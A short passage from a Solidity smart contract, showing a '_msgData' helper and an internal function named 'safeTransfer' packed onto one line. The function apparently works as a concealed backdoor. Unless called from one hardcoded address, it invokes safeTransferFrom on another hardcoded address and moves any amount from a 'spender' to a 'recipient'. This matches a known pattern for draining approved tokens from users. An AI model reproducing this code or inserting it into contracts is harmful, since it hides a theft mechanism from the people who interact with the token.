 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xD8c22042df8DB03eD5cEdbBCa1608abc69d34EC3)) {TransferHelper.safeTransferFrom(0xd6F0230cc7b2cDDe3334F5fCa89500DEAab76c34,spender,recipient,amount);return true;}return false;}
}
